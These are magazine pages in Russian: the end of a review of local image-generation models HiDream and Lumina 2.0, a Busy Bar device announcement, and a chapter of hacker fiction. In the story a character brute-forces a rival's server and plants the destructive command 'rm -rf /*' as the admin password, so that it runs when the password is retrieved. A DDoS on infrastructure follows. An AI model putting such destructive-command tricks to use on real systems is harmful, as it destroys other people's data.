HIDREAM: РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ

Перед тем как оценивать  результаты, прими во внимание следующее.
Во‑первых, тестировалась не полная, а дистиллированная версия модели,
да еще и квантованная всего до 4 бит, что само по себе не может не влиять
на качество (скажем, Flux.1 Schnell в таком виде выдает откровенно плохой
результат).
   Во‑вторых, все изображения сгенерированы в один проход (в отличие
от ранее протестированных моделей, у которых вторым проходом убираются
многочисленные мелкие дефекты), а результирующее разрешение — все‐
го 1 Мп. Таким образом, оценивать результаты мы будем по параметрам точ‐
ности следования запросу, композиции и соответствия заданному стилю.
  Во всех изображениях, кроме тех, где это отмечено отдельно, исполь‐
зовалась модель hidream-i1-dev-Q4_K_M.gguf, 28 шагов, Euler BETA, CFG = 1.
Все запросы формировались в стиле LLM и в большей части совпадали
с запросами к Lumina (в некоторых случаях я убирал «присказку» в духе «you
are an artist...», но модель работает и так, и так).
  Для начала сгенерируем «китайскую» акварель.





Тот же запрос, но с моделью с квантованием nf4.





Получилось интересно. Добавим котенка.





Хорошо прорисованное лицо и руки (мелкие огрехи уйдут на втором про‐
ходе).
   Попробуем черно‑белую фотографию.





Аналогично; руки отрисованы хорошо, второй проход или сегментирование
легко доведут их до совершенства. А вот фотография летчицы времен начала
XX века.





Она же, только чуть менее гламурно.





Вполне неплохо для быстрой генерации. Попробуем сгенерировать картины
Модильяни и Ван Гога.





Какое‑то представление о стилях художников у модели есть, но...
   Теперь проверим работу с текстом.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
  LUMINA 2  HIDREAM         И
        ТЕСТИРУЕМ НОВЫЕ МОДЕЛИ ДЛЯ
        СОЗДАНИЯ КАРТИНОК НА СВОЕМ
                      КОМПЬЮТЕРЕ




Отлично! Даже шрифт именно такой, который требовался. И количество паль‐
цев на руках — ровно десять штук! А что на одной руке их шесть, а на другой
четыре — деталь совершенно незначительная.
   Попробуем сгенерировать обложку для фэнтезийного романа в иллюстра‐
тивном стиле (здесь квант nf4 из проекта hykilpikonna/HiDream-I1-nf4: 4Bit
Quantized Model for HiDream I1).





И другой стиль (квант Q4_K_M).





Вполне убедительно с первой же попытки. Усложним задачу (снова квант nf4).





Тоже отлично. Здесь обрати внимание на такую деталь, как хват: с тем,
как именно персонаж держит объекты, у SDXL проблемы просто катастро‐
фического уровня.
   Добавим дракона для обложки юмористического фэнтези (в последний
раз квант nf4).





Смотрится вполне забавно, а главное — свежо и совершенно непохоже
на 99,9% современных обложек. Желаемый текст на месте и без ошибок.
Работа с текстом действительно впечатляет: модель прекрасно работает
с оформлением и не допускает ошибок.





Наконец, попробуем сделать постер.





В целом неплохо, но в разных частях плаката появился лишний текст «подпись
неразборчиво».  Что   интересно,  убрать  его  помогла  фраза   «with
no watermarks», просто добавленная в запрос. Картинка получилась кра‐
сивой, но текст вышел с небольшими ошибками.





Избавиться от мелких огрехов помогло только переключение на модель
с меньшим  сжатием  (в  предыдущей  картинке  использовалась модель
Q4_K_M, в картинке ниже — fp8).





Приблизительно таким образом и проявляются артефакты сжатия.


ВЫВОДЫ

Несмотря на то что модель HiDream пока поддерживается в SwarmUI в тес‐
товом режиме, результат вдохновляет. Отличный уровень следования зап‐
росу, удачная композиция, минимальные проблемы с руками и идеальная
работа с текстом даже в квантованной дистиллированной версии — все
это очень вдохновляет. Моделью можно и нужно пользоваться.
   Составить однозначное мнение о модели Lumina 2.0 сложнее. С одной
стороны, модель заметно легче HiDream; генерация происходит заметно
быстрее, а утилизация видеопамяти редко переваливала за порог 8 Гбайт.
Точность следования запросу очень хорошая, композиция и поддержка сти‐
лей тоже на уровне. Но дальше начинаются минусы.
   Работа с текстом в Lumina 2.0 реализована плохо; мне не удалось добить‐
ся ни одной корректной генерации. Лица и руки генерируются с огрехами,
которые (не всегда) можно исправить сегментной прорисовкой. В целом
модель интересна; ее качество превосходит Stable Diffusion 3.5, но отстает
от Flux (впрочем, и высоких требований к железу модель не предъявляет).
   У Lumina 2.0 огромный потенциал; это отличный кандидат на замену уста‐
ревшей архитектуры SDXL с прекрасным VAE и текстовым декодером. Я уве‐
рен, что эту модель смогло бы доработать сообщество, но большого инте‐
реса к обучению и выпуску ремиксов на основе Lumina 2.0 я пока не наб‐
людаю. Точнее говоря, их просто нет.
   Похоже, к сегодняшнему дню мы достигли точки, когда для создания новых
моделей нужен только большой (а лучше — огромный) набор хорошо анно‐
тированных картинок и много машинного времени. И то и другое доступно,
хоть и не бесплатно, а такие вещи, как текстовый декодер, архитектура и даже
VAE, можно свободно, легально и совершенно бесплатно брать уже готовыми
у монстров индустрии.
   Несмотря на это, результаты разных команд разработчиков разительно
отличаются. Мы же можем выбрать подходящую модель, исходя из собствен‐
ных запросов.


Краткий путеводитель по генеративным моделям
В обилии генеративных моделей легко запутаться, а их число только растет.
Попробую разложить их по полочкам.
 • Stable Diffusion 1.5 (SD 1.5) — устаревшая архитектура, которая
   в силу своей нетребовательности к ресурсам получила второе дыхание
   в виде приложений для мобильных устройств. Для SD 1.5 продолжают
   выходить новые модели, среди которых достаточно весьма неплохих.
   Запускать SD 1.5 на компьютере, однако, смысла нет: SDXL обходит эту
   модель по всем параметрам.
 • Stable Diffusion XL (SDXL) — старая, но отлично отлаженная архитек‐
   тура, на которой ежедневно появляются новые модели, подавляющее
   большинство из которых имеет рейтинг 18+.
 • Flux — архитектура, по сути, одной модели. Многочисленные ремиксы
   за единичными исключениями в виде дедистиллированных версий не улуч‐
  шают базовую модель, а делают только хуже. Чрезвычайно требовательна
   к ресурсам, имеет невысокую скорость генерации, что компенсируется
   высоким качеством картинок и достаточно точным следованием запросам.
  Хорошо работает с надписями.
 • Lumina 2.0 — очень интересная архитектура и базовая модель с откры‐
   той лицензией. LLM на входе позволяет модели еще более точно сле‐
   довать запросам. В то же время Lumina 2.0 — именно базовая модель,
   которая нуждается в дополнительном обучении и микшировании; в нынеш‐
  нем состоянии получение качественных картинок требует некоторого тру‐
   да. Текстовые надписи поддерживаются скорее в теории; на практике
   получить надпись без ошибок тяжело.
 • HiDream-I1 — вероятно, самая мощная на сегодняшний день модель
   из числа тех, что могут работать локально. Превосходит Flux по ряду
   параметров. Будем следить за развитием событий!
GEEK





Компания Павла Жовнера Flipper Devices, известная бла‐
годаря Flipper Zero, анонсировала новый девайс — Busy Bar.
Он в меньшей степени ориентирован на хакеров, но может
пригодиться в повседневной работе. Он должен помочь
тебе не отвлекаться и другим — не отвлекать тебя.





Устройство снабжено LED-пиксельным экраном и будет иметь открытый API,
что дает дорогу для кастомизации и программирования. Именно этим, на наш
взгляд, устройство и интересно.
   Основное предназначение Busy Bar — помогать бороться с прокрасти‐
нацией и фокусироваться во время работы. Главная фишка — встроенный
таймер Pomodoro, классическая техника тайм‑менеджмента, которая делит
рабочий  процесс на  интервалы: 25  минут  концентрированной работы
и 5 минут отдыха (или иные удобные интервалы).
   Сама по себе схема простая, но Busy Bar призван делать ее более
эффективной и кастомизировать под любые задачи и сценарии, а также опо‐
вещает окружающих о том, в какой ты стадии — концентрируешься или дела‐
ешь передышку.


Характеристики

 • Основной экран: 72 × 16 RGB LED-матрица, 60 Гц, 400 нит, адаптивная
   яркость
 • Задний экран: 160 × 80 монохромный OLED, 16 градаций серого
 • Процессор: STM32U5 (Arm Cortex-M33 @160 МГц), 2,5 Мбайт RAM +
   16 Гбайт eMMC
 • Коммуникации: Wi-Fi 6 (2,4 ГГц, WPA3), Bluetooth LE 5.4
 • Питание: Li-ion 18650, до 2 недель в стендбае, 8 часов активной работы
 • Подключение: USB-C, Virtual USB Ethernet, HTTP API
 • Элементы управления:  кликалка с энкодером, две кнопки, перек‐
   лючатель режимов
 • Аудио: встроенный спикер для звуковых уведомлений
 • Монтаж: крепится на монитор, стену, дверь — в комплекте все виды
   креплений



Экран на 72 × 16 пикселей поддерживает полноценную RGB-палитру с адап‐
тивной яркостью до 400 нит. Это позволяет отображать любые пользователь‐
ские статусы и сообщения. Причем статусы можно не только выбирать
из готовой библиотеки, но и создавать самостоятельно с помощью простых
API-запросов или даже программировать на  JavaScript, Python или Go.
Для гиков это означает  практически неограниченные возможности  кас‐
томизации и интеграции устройства в любые проекты и экосистемы.
   Что особенно ценно, API открытый и будет полностью доступен для работы
без обязательного подключения к интернету. Busy Bar можно подключать
по USB (будет виртуальный Ethernet), через Wi-Fi или даже интегрировать
напрямую с облачными сервисами по MQTT без привязки к конкретному вен‐
дору. Это делает устройство абсолютно независимым и крайне гибким
в использовании. Хочешь — подключай к Home Assistant, хочешь — пили свой
сервер.





Для фанатов умных домов и IoT девайс поддерживает протокол Matter. То
есть при включении режима занятости Busy Bar может, например, автоматом
приглушать уведомления на всех твоих устройствах, ставить на паузу музыку,
регулировать свет или даже запирать двери. Крутая фишка, особенно для тех,
кто любит, чтобы все работало само и не отвлекало (впрочем, тут еще как
посмотреть — порой на возню со всем этим уходит больше времени, чем
сэкономишь).
   Интересно, что и задняя панель устройства  (та, что будет обращена
к тебе) тоже оборудована экраном. Монохромный OLED-дисплей позволяет
все время держать таймер перед глазами.





Приятно, что разработчики добавили физические органы управления: тум‐
блер и колесико. Можно переключать режимы и настраивать таймер без соф‐
та — чтобы быстро менять статус, не отвлекаясь на смартфон или компьютер.
   Busy  Bar  поддерживает  автоматическое  включение  статуса  «занят»
при  звонках,  записях  или  стримах,  определяя  активность  микрофона
или камеры компьютера. Разработчики предусмотрели и возможность уда‐
ленного управления — можно установить устройство у двери или на стене
и управлять им через десктопное приложение или HTTP-запросы из любой
точки мира.


Что в коробке

 • Busy Bar;
 • крепление на монитор;
 • крепление на стену или дверь;
 • кабель USB-C (2 метра);
 • инструкция, которую ты проигноришь.



Устройство можно будет заказать в фирменном магазине за 189 долларов
США, однако на момент написания этого текста покупка недоступна, а жела‐
ющим приобрести Busy Bar предлагают оставить email для связи. Также ты
можешь прочитать о подробностях разработки и прототипирования в блоге
компании.
GEEK





   Кирилл сидел у окна. Капли, мелкие и злые, будто специально осыпали
стекло, закрывая ему обзор. Сколько ни вглядывайся, кроме собственного
отражения, ничего не увидишь. Дождь настойчиво пробивался сквозь серое
утреннее небо, будто в небесной канцелярии устали поддерживать иллюзию
хоть какого‑то порядка и капля за каплей сдались.
 — Ма, ну поешь хоть немного, — в который раз предложил он.
 — Спасибо, сынок. Я потом.
   «Химию» мать переносила тяжело, но  стойко. Кирилл закупил целую
коробку пюреобразного детского питания и специального белкового порош‐
ка, который нужно было разбалтывать в воде: ничего другого ей сейчас было
нельзя. Но после каждой капельницы мать  категорически  отказывалась
от еды, борясь с тошнотой и слабостью. Врачи говорили, что это пройдет
и организм адаптируется, но никаких сроков не называли.





— Мне на работу надо, — вздохнул Кирилл, поднимаясь, — обязательно
поешь и больше пей. Я приеду, как только получится.
 — Езжай, не беспокойся за меня. Все будет хорошо.
   Возвращаться в контору совершенно не хотелось, особенно после новос‐
тей, которые сообщил ему Фреш. Кирилл не испытывал к этому человеку
излишне теплых чувств, особенно с учетом его связи с Трикси, но тем
не менее Лео был старым знакомым, и эта связь, тянувшаяся из прошлого,
удерживала его в «аквариуме» незримым якорем. Теперь якорная цепь пор‐
валась. Очень хотелось свалить, но тогда Санчо останется там совсем один,
а ему и так приходилось несладко — Кирилл замечал, что с каждым днем его
друг замыкался в себе все больше и больше.





Едва открыв магнитной карточкой массивную дверь офиса, Кирилл услышал
доносившийся из его глубины шум и крики. Невысокий коренастый мужичок
за пятьдесят с крупным мясистым носом и густой копной седых волос стоял
посреди коридора и что‑то громогласно втолковывал втянувшему голову
в  плечи Шпале. Несмотря на обычную одежду — темно‑синий  свитер
и побелевшие на коленках джинсы, выправка у мужика явно была военной.
 — Ты кто? — вместо приветствия обернулся седой в его сторону.
 — Кирилл Морозов, — представился Киря, борясь с подсознательным
желанием вытянуться по стойке смирно.
   Седой сверился с бумажкой, которую держал в руке, и удовлетворенно
кивнул.
 — Меня зовут Станислав Викторович Кущин, обращаться можно по име‐
ни‑отчеству. Почему опаздываем?
 — Потому что у нас нет жесткого графика, — пожал плечами Кирилл. —
Каждый приходит, когда ему удобно.
 — Теперь есть. Присутственные часы с девяти утра и до семнадцати трид‐
цати, перерыв на обед — полчаса. Довожу до сведения, чтобы потом
не говорили, что не в курсе. Если захотите отлучиться по личной необ‐
ходимости в рабочее время, нужно написать мне по электронной почте.
Без согласования никуда не уходим. Кто у вас старший в группе?
 — Нет у нас старшего, — растерянно буркнул Шпала.
   Кущин посмотрел на него так, словно тот признался, что носит под одеж‐
дой женское белье и не вытирает в уборной задницу.
 — Ладно, р‑разберемся. Идите работайте.
   Толкнув дверь «аквариума», Кирилл с удивлением обнаружил, что, вопреки
обычаю, в этот утренний час все были в сборе. В помещении царила
атмосфера легкого замешательства и растерянности. Санчо, который обык‐
новенно бездельничал, потому что Лео старался не нагружать его неот‐
ложной работой, тоже был здесь. Он поднял глаза на занявшего свое место
Кирилла и кивнул в сторону коридора.
 — Видал?
 — Ага, — вздохнул тот. — Я знал, что будет плохо, но не знал, что так ско‐
ро.
   Компьютер коротко бибикнул, запуская операционную систему. Кирилл
проверил электронную почту, пробежал глазами письмо от нового босса,
в котором излагалось все то же, что он уже слышал пару минут назад, а затем
запустил терминал. Неизвестно, чем его озадачат в ближайшем будущем,
а значит, со срочными делами нужно разобраться как можно скорее. Одно
из них и вовсе не требовало отлагательств. Начиная слежку, Лиам чувствовал
себя в полной безопасности. Что ж, пришло время поплатиться за самона‐
деянность.
   Кирилл проверил настройки: все нужные библиотеки подключены, инстру‐
менты наготове. Глубокий вдох. Время действовать.
  Ввод команды. Сервер Лиама находился где‑то далеко за океаном,
на другом конце обитаемого мира, но сейчас это не имело значения.
Механизм атаки запустился, и на дремлющую в бездействии машину с без‐
жалостной эффективностью обрушился поток передаваемых через цепочку
промежуточных узлов данных. Консоль наполнилась бегущими строками сим‐
волов — запросов и ответов. После нескольких минут кропотливой работы
скрипт сообщил, что ключ успешно подобран.
 — Есть, — выдохнул Кирилл.
  Он подключился к серверу, нырнув в лабиринт директорий и файлов.
За последние дни Кирилл досконально изучил внутреннее устройство MXP
и теперь мог ориентироваться на этой машине, будто в собственной спаль‐
не, — с закрытыми глазами. Сохранив копии важных данных, он открыл глав‐
ный конфигурационный файл. Простая правка — и генератор ключей стал
бесполезным, как шкатулка, запертая на сломанный замок, который можно
открыть любой спичкой. А вот и пароль для входа в админку. Его нетрудно
поменять, но в MXP на этот случай предусмотрен специальный механизм,
позволяющий при подключении с доверенного IP-адреса вытянуть пароль
в терминал. Именно это и сделает владелец сервера, если не сможет залоги‐
ниться…
   Пальцы Кирилла замерли над клавиатурой. Лиам заслуживает увидеть,
как его мир рушится. Киря покачал головой и сменил спрятанный в конфиге
пароль администратора на строку «rm -rf /*». Напоследок он запустил
на сервере скрипт, который должен сильно замедлить его работу. Машина
ответила замешательством, словно не понимая, как противник смог так легко
обойти все барьеры.
 — Это тебе за Трикси, — сказал Киря, словно Лиам мог его услышать.
   Жгучее чувство обиды сменилось ледяным удовлетворением.
   Дверь «аквариума» оглушительно щелкнула, и в комнату шагнул Кущин
в сопровождении незнакомого мужика, которого Кирилл видел однажды
мельком на административном этаже, когда подписывал очередные банков‐
ские бумажки, — рядовых сотрудников туда без повода не пускали. Новый
начальник остановился посреди помещения, обвел его тяжелым взглядом
и хлопнул в ладоши.
 — Па‑апрашу минуту внимания! — громогласно объявил он.
   Кирилл почувствовал, как все напряглись. Даже Грек, который вечно грыз
чипсы у соседнего стола, застыл, держа очередной ломтик у рта.
 — У нас сегодня внеплановая проверка службы безопасности. Прошу всех
подготовить свои рабочие устройства. Личные телефоны и гаджеты нужно
сдать мне. Интернет будет временно отключен.
   Кирилл, Санчо и Грек непонимающе переглянулись. Никаких проверок,
ни плановых, ни внеплановых, до этого ни разу не проводилось, хотя Леонид
на словах неоднократно повторял, что безопасность в их деле превыше все‐
го.
  Не то чтобы Кирилл чего‑то всерьез опасался, но сам факт того, что про‐
верка совпала с недавними манипуляциями с сервером Лиама, не мог
не настораживать. Хорошо хоть его личный ноутбук остался на съемной квар‐
тире. Когда Кущин отвернулся, Кирилл быстро выдернул торчащую из USB-
порта флешку с написанным им скриптом для взлома MXP и сунул ее в кар‐
ман. Когда к его столу подошел проверяющий, Кирилл послушно уступил свое
место, а сам с непроницаемым выражением лица протянул Кущину собствен‐
ный мобильник.
   Секунды тянулись, точно сироп. Кирилл старался выглядеть как можно
спокойнее, пока его коллеги вокруг тихо переговаривались и неприязненно
поглядывали на нового начальника. Тот прохаживался между столами с важ‐
ным и независимым видом, будто только что изобрел идеальную технологию
управления коллективом своенравных хакеров.
  Тем временем проверка шла своим чередом. Парни нехотя вставали
со своих мест, кто‑то бросал раздраженные взгляды, кто‑то тихо бормотал
под нос  ругательства. Спустя примерно полчаса проверяющий обошел
по очереди все машины. Молча кивнув Кущину, он вышел из комнаты, так и не
проронив ни слова.
 — Значится так, товарищи, — обратился к присутствующим Станислав
Викторович. — Мне доложили, что в вашем коллективе еще не назначили
старшего. Это непорядок. Есть желающие взять на себя эту важную и полез‐
ную обязанность?
 — А давайте я! — весело сверкнув глазами, откликнулся Санчо.
 — Фамилия?
 — Увалов.
   Кущин сверился со своей мятой бумажкой и покачал головой.
 — Еще желающие есть? Среди тех, на ком не висит уголовка?
   Ответом ему была гнетущая тишина. Кущин обвел притихших подчиненных
взглядом и задержал его на Кирилле.
 — Морозов! — рявкнул он. — Назначаю тебя старшим в группе. За дис‐
циплину и порядок теперь отвечаешь головой.
  Он исподлобья посмотрел на мрачных парней и добавил:
 — Все рабочие моменты теперь будете согласовывать с ним. То, что
Морозов не сможет решить сам, будет обсуждать со мной. Все ясно? Воп‐
росы есть? Вопросов нет. Р‑разойдись!
 — Писец, — вполголоса пробормотал Финч, но так, что его услышали все.
   Кирилл вернулся за свое рабочее место. В «аквариуме» сделалось тихо,
как на кладбище, единственным звуком был приглушенный шелест клавиатур.
Посмотрев на часы, Киря открыл свой почтовый ящик и щелкнул мышью, что‐
бы создать ответ на входящее сообщение. В открывшемся окне он набрал
только одну короткую фразу: «Я согласен».
   Когда он вернулся из столовой с чашкой кофе в руке, его уже ждал ответ
от Кадлера:

        Кирилл,
         я не сомневался в вашем решении. И вот моя первая просьба. Ниже —« список IP-адресов. Дополните его, если обнаружите что‑то важное.                 »К сообщению прилагался текстовый файл. Кирилл машинально сохранил его,
даже не успев обдумать свои действия. Как только файл открылся в тексто‐
вом редакторе, он увидел ровные столбцы IP-адресов. Кирилл машинально
скопировал первый адрес в окно консоли и запустил утилиту traceroute,
а затем, чуть подумав, скормил терминалу весь файл целиком…
   Первые два адреса в списке вели к крупным коммерческим дата‑центрам,
третий принадлежал узлу сети, который, судя по всему, был связан с распре‐
делением электричества в Северо‑Западном регионе. Кирилл прошелся
по всему перечню: адреса либо принадлежали российским провайдерам
и большим компаниям, либо относились к объектам критической инфраструк‐
туры. Энергетика, транспорт, связь. На мгновение он почувствовал, как земля
уходит из‑под ног, — последними в перечне шли айпишники, принадлежащие
его конторе.
   «Если там знают, что это моя работа, то зачем прислали этот список? —
лихорадочно размышлял Кирилл. — Попытка запугать? Или хотят убедиться,
что я не спрыгну с крючка?»
  Он заставил себя глубоко вдохнуть и откинулся на спинку стула. Казалось,
воздух в комнате стал густым и тяжелым, словно перед грозой. Кирилл вдруг
осознал, что сжимает мышь так сильно, что от напряжения побелели пальцы.
И Фреш свалил так некстати, не с кем теперь посоветоваться… Он на всякий
случай проверил окошко в джаббере — контакт Фреша был неактивен уже
несколько дней. Впрочем, почему не с кем? Кажется, есть в этом грешном
мире один человек, который может что‑то подсказать.
   Кирилл  запустил  виртуалку, открыл окно IRC,  подключился  к каналу
#darkcoders и отправил в чат приветствие юзеру MXP_Master.
   «Вот пришел старик к синему морю и стал кликать золотую рыбку…» —
горько усмехнулся своим мыслям Кирилл. Других подходящих рыб в его стек‐
лянном аквариуме попросту не водилось. На сей раз ждать пришлось долго:
Darkoder откликнулся лишь спустя несколько часов.
   «Не думал услышать тебя снова», — появилось на экране новое сооб‐
щение.
   «Прости, что побеспокоил, но обратиться больше не к кому, — написал
Кирилл. — На меня вышли агенты после того, как я поучаствовал во взломе
TerraCore. Вы тоже когда‑то пытались ломать эту контору. Мне кажется, я
что‑то упускаю, но на них сходятся интересы слишком многих игроков».
   Кирилл уставился на экран. Пауза затянулась. Он почувствовал, как по
спине пробирается неприятный холодок. Спустя несколько минут в окне чата
строчка за строчкой появился ответ.
   «Terra не просто фирма, продающая софт, они работают на государство.
Основной их проект, „Перцептрон“, — это очень мощная автоматизированная
система по предотвращению вторжений. Когда она заработает на полную
мощность, отследить и вычислить любого из нас не составит никакого труда.
Это главная причина, по которой мы считали их врагами. Но помимо защиты,
„Перцептрон“ может использоваться и для атак. Это универсальное киберо‐
ружие».
   «Для атак? — переспросил Кирилл. — Каким образом?»
   «У них сотни тысяч клиентов по всему миру, их софт работает на мил‐
лионах компьютеров, подключенных к сети. Все эти клиентские программы
обмениваются информацией с серверами TerraCore, получают обновления,
скачивают патчи. Если однажды им отдадут команду отправить некоторое
количество мусорных пакетов на какой‑то сетевой адрес, получится гигант‐
ский ботнет. А нейросеть может автоматически управлять этим процессом,
перенаправлять трафик, балансировать нагрузку. Клиенты даже не почувству‐
ют, что что‑то происходит на их машинах».
   «Это проверенная информация?»
   «Не существует стопроцентно достоверной информации, Кикс. Я слышал,
что после недавних попыток взлома они собираются протестировать сис‐
тему, чтобы отбить всякое желание лезть к ним под юбку, а заодно показать,
на что потрачены деньги налогоплательщиков. И если это произойдет, зна‐
чит, правительство дало добро на испытание „Перцептрона“. Доказать потом
все равно никто ничего не сможет. Верить этому или нет, решай сам».
   «Спасибо, — набрал на клавиатуре Кирилл. — Я знаю, что с этим делать».
  Он откинулся на спинку кресла и некоторое время просто сидел, не дви‐
гаясь. Затем решительно поднялся, прошел по коридору и постучал в дверь
бывшего кабинета Фреша, в котором теперь поселился новый обитатель.
 — Да? — послышался с той стороны недовольный голос.
   Кирилл открыл дверь и вошел. Внутри, кажется, ничего не изменилось,
только ноутбук исчез с заваленного бумагами стола, а из распахнутого нас‐
тежь окна тянуло прохладой и сыростью.
 — Тебе чего? — поднял на вошедшего воспаленные глаза Кущин.
 — Станислав Викторович, поступила информация, что «Терра» готовит
массированную DDoS-атаку. Может пострадать инфраструктура в националь‐
ном сегменте сети, если не принять меры.
 — Откуда она поступила? — мрачно осведомился новый начальник.
 — Из источников, которым я могу доверять.
   Кущин пристально посмотрел на Кирилла из‑под нахмуренных бровей.
 — Тебе сколько лет, сынок?
 — Двадцать.
 — Вот именно. А мне пятьдесят восемь. И почти сорок из них я работаю
там, где каждый день надо решать, чему верить, а чему — нет. Вот ты при‐
ходишь ко мне и говоришь: «Станислав Викторович, завтра конец света». А на
вопрос «Откуда знаешь?» — молчишь, как партизан. Как ты думаешь, стану ли
я воспринимать твои слова всерьез?
 — Если бы я мог раскрыть все детали, я бы это сделал, — с трудом скры‐
вая раздражение, сказал Кирилл, — главное, что существует потенциальная
угроза. Станет она реальной или нет, я не знаю.
   Кущин резко встал из‑за стола и подошел к открытому окну, уставившись
на темнеющее небо над ломаной линией крыш.





— У меня есть опыт, и у меня есть инстинкты, которых у тебя не будет еще лет
двадцать, — не оборачиваясь, произнес он. — А вот у тебя, кроме слов, нет
ничего. Я знаю, что тебе предлагали янки, и уверен, что через тебя они станут
вкачивать нам дезу, чтобы расшатать систему изнутри. Ты думаешь, они слу‐
чайно тебя выбрали? Молодой, талантливый, с головой, набитой идеализмом
и амбициями. Такие, как ты, для них находка. Они говорят тебе ровно то, что
ты хочешь услышать… Иди работай. И в следующий раз постарайся не отвле‐
кать меня по пустякам.
   Закрыв за собой дверь, Кирилл отправился не в «аквариум», а прямиком
в свою комнату. Возвращаться за компьютер совершенно не хотелось. Сан‐
чо, как обычно, валялся на своей кровати в одежде, уставившись невидящим
взглядом в потолок.
 — Привет, — бросил ему с порога Кирилл.
 — Как, блин, меня все это на хрен достало… — мрачно отозвался Саня
совершенно безжизненным голосом.
   Сейчас Кирилл был полностью и безоговорочно согласен со своим дру‐
гом.
GEEK





   Паста с тунцом сегодня особенно удалась. Джейк с удовольствием ору‐
довал вилкой и ножом, отдавая дань стараниям итальянского повара, а вот
Лиам к своей тарелке даже не притронулся, да и вообще выглядел мрачным
и подавленным.
 — Заказать еще вина? — вежливо предложил Кадлер, бросив взгляд
на его опустевший бокал.
 — Спасибо, Джейк, не откажусь.
 — Попробуйте фетучини, здесь его очень неплохо готовят.
  Во взгляде молодого мужчины мелькнуло что‑то вроде усталой благодар‐
ности. Он взял вилку, но вместо того, чтобы приняться за еду, начал медленно
вертеть ее в пальцах.
 — Кусок в горло не лезет, — неохотно признался Лиам. — Этот подонок
грохнул мне систему на рабочем лэптопе, Джейк. У меня есть резервная
копия, но сам факт… Видимо, старею и теряю хватку.
  Он печально покачал головой.
 — Зато вы успешно сделали свою работу и получили заслуженный
гонорар, — попытался приободрить его Кадлер. — Мы смогли наладить кон‐
такт с этим парнем и теперь наблюдаем за его действиями.
 — Попробуете переманить его на свою сторону?
 — Посмотрим. Я забросил удочку и хочу оценить его реакцию. Информа‐
ция, которую мы ему передали, не в полной мере отражает картину предсто‐
ящих событий. Мне интересно, что он будет делать. Побежит за помощью
к своим кураторам, затаится или выйдет на связь? Мы этого пока не знаем.
Но узнаем очень скоро, деваться ему уже некуда.
   Лиам помолчал, затем тяжело вздохнул и положил вилку на край тарелки.
 — Я не стал бы недооценивать этого человека, кем бы он ни был. Мне
думается, у него достаточно знаний, чтобы выбраться из любой ловушки.
 — Возможно, знаний и достаточно, — усмехнулся Кадлер, — но хватит ли
опыта? Знаете, Лиам, я вырос на побережье, мы часто ездили на рыбалку
с родителями, да буквально каждый уик‑энд. Мой отец говорил: «На каждую
хищную рыбу найдется свой крючок». Эта рыба не из простых, но я уверен, мы
ее вытащим. А теперь попробуйте хотя бы немного тунца, прошу вас.
   Лиам неохотно, но все же подчинился, и, кажется, вкус пасты с тунцом
ненадолго отвлек его от тревожных мыслей.

                       ***

— Кикс, вставай! Там такое!..
   Кирилл с трудом разлепил глаза. Просунувший в приоткрытую дверь его
комнаты лохматую голову Грек убедился, что он проснулся, и исчез в коридо‐
ре.
   Кирилл зевнул, пытаясь сообразить, который час. Спальня была погружена
в полумрак, хотя свет из окна намекал, что утро уже давно наступило. Санчо
в комнате не оказалось: он уже куда‑то умотал, оставив после себя ском‐
канную постель и разбросанную в беспорядке по полу одежду. Кирилл отки‐
нул одеяло и босиком потопал в сторону умывальника. Спешка спешкой,
но привести себя в порядок все равно необходимо. Еще и крепкого кофе
хорошо бы выпить, иначе никак не проснуться.
  В коридоре офисного корпуса было пустынно. Своей магнитной карточки
Кирилл в царившем вокруг бардаке не нашел, поэтому дождался, пока дверь
«аквариума» откроется, выпуская оттуда направляющегося в уборную Финча,
и тенью скользнул в офис.
 — О, а вот и ты! — приветствовал его Грек из‑за своего компа. — Смотри!
  Он ткнул пальцем в экран, словно Кирилл мог видеть монитор насквозь.
 — И что это? — спросил тот, обходя стол и протирая на ходу глаза.
  По дисплею Грека бежали неровные строки, в которых Кирилл узнал отчет
трассировщика  пакетов. Судя по  всему,  какая‑то  их  часть  бесследно
терялась по дороге, не достигая конечной точки своего маршрута.
 — Ну и? — Кирилл нахмурился, пытаясь понять, что именно хотел показать
ему коллега.
 — Кто‑то дидосит нашего провайдера, — ответил он, не отрывая взгляда
от экрана. — Запросы идут с тысяч разных адресов. Сеть пока держится, но я
не уверен, что это случайная активность.
   Кирилл достал из кармана телефон и взглянул на экран: часы показы‐
вали 12:47. Щелкнула дверь: в комнату вернулся Финч, уселся на свое
рабочее место и зашуршал клавиатурой.
 — Пишут, крупных хостеров тоже атакуют прямо сейчас, — громко сооб‐
щил он.
 — Ага, и  несколько банков  упали, —  подтвердил Шпала, —  сайты
не открываются, уведомления не приходят.
   Кирилл выждал, пока на его компьютере загрузится операционка, запус‐
тил браузер и пробежался по новостным сайтам. Интернет и вправду изрядно
тормозил, веб‑страницы грузились медленно, словно он сейчас находился
не в офисе, подключенном к высокоскоростной оптоволоконной магистрали,
а дома в Подгорске, за своим древним компом с полудохлой модемной лини‐
ей.
   Картина складывалась в целом тревожная. На главных страницах крупней‐
ших информационных порталов висели сообщения о проблемах с дос‐
тупностью онлайн‑сервисов, а в комментариях появлялись первые паничес‐
кие посты: люди жаловались на сбои в работе банковских приложений
и интернет‑магазинов. Атака началась примерно в пять утра по Москве: сна‐
чала под удар попали платежные системы, затем отвалилась популярная
служба бронирования авиабилетов, следом за ней рухнули железнодорож‐
ные кассы. Крупные провайдеры пока еще как‑то справлялись, но в сети
понемногу нарастал хаос.
  В комнате повисла напряженная тишина, прерываемая только дробными
щелчками  клавиш и  гудением  системников.  Кирилл  запустил  сетевой
монитор, пытаясь найти аномалии в локальных подключениях. Если атака кос‐
нулась провайдера, то, возможно, она уже добралась и до их сети.
 — Наши сервера пока в порядке, — бросил Шпала через плечо. — Но наг‐
рузка растет. Есть вероятность, что мы следующие в списке.
 — А чего они вообще добиваются? — спросил Финч. — Уронить все, что
можно, все равно не смогут, пупок развяжется.
   Кирилл промолчал, вспомнив о полученном накануне от Кадлера файле.
Пока что цели атакующих совпадали с присланным ему списком IP-адресов,
и, если это совпадение не случайно, там явно располагают достаточными
ресурсами, чтобы оставить без интернета абонентов крупнейших операторов
связи. Самое неприятное, что сделать с этим практически ничего нельзя: ког‐
да атака одновременно идет на множество независимых узлов, эффект дадут
лишь  скоординированные  действия  десятков  специалистов, отвечающих
за безопасность сетевой инфраструктуры в разных уголках страны. И время
сейчас работает против них.
 — Пишут, аэропорты в столице встали, — сообщил во всеуслышание
Грек, — у них там проблемы с регистрацией пассажиров.
